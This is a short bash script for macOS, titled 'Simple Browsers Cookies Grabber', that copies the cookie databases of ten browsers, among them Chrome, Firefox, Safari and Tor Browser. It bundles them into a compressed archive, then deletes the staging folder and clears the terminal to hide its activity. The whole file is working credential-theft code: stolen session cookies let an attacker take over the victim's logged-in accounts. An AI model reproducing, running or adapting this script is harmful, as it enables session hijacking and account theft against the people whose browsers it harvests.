
#!/bin/bash
#*******************************************************************************#
# Simple Browsers Cookies Grabber by @Seekurity
# Author: Mohamed Abdelbasset Elnouby
# Twitter: @SymbianSyMoh
# Email: MaeBaset@Seekurity.com
#*******************************************************************************#

mkdir ~/Desktop/Cookies/

# 1. Grab Chrome Cookies
cp "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" ~/Desktop/Cookies/ChromeCookies.db

# 2. Grab Chrome Canary Cookies
cp "$HOME/Library/Application Support/Google/Chrome Canary/Default/Cookies" ~/Desktop/Cookies/ChromeCanaryCookies.db

# 3. Grab Chromium Cookies
cp "$HOME/Library/Application Support/Chromium/Default/Cookies" ~/Desktop/Cookies/ChromiumCookies.db

# 4. Grab Firefox Cookies
# Searches for the default profile name
path=$(find "$HOME/Library/Application Support/Firefox/Profiles/" -maxdepth 1 -type d -name '*default*' -print0)
file="$path/cookies.sqlite"
cp "$file" ~/Desktop/Cookies/FirefoxCookies.db

# 5. Grab Opera Cookies
cp "$HOME/Library/Application Support/com.operasoftware.Opera/Cookies" ~/Desktop/Cookies/OperaCookies.db

# 6. Grab Opera Developers Cookies
cp "$HOME/Library/Application Support/com.operasoftware.OperaDeveloper/Cookies" ~/Desktop/Cookies/OperaDevelopersCookies.db

# 7. Grab Opera Neon Cookies
cp "$HOME/Library/Application Support/Opera Neon/Default/Cookies" ~/Desktop/Cookies/OperaNeonCookies.db

# 8. Grab Vivaldi Cookies
cp "$HOME/Library/Application Support/Vivaldi/Default/Cookies" ~/Desktop/Cookies/VivaldiCookies.db

# 9. Grab Safari Cookies
cp ~/Library/Cookies/Cookies.binarycookies ~/Desktop/Cookies/SafariCookies.db

# 10. Grab TOR Cookies
# Searche for the default profile name
path=$(find "$HOME/Library/Application Support/TorBrowser-Data/Browser" -maxdepth 1 -type d -name '*default*' -print0)
file="$path/cookies.sqlite"
cp "$file" ~/Desktop/Cookies/TORCookies.db

# Compress collected cookies
tar cvfz ~/Desktop/Cookies.tgz ~/Desktop/Cookies/*

# Remove the created cookies folder
rm -rf ~/Desktop/Cookies/

# Clear Clear Clear
clear && clear && clear
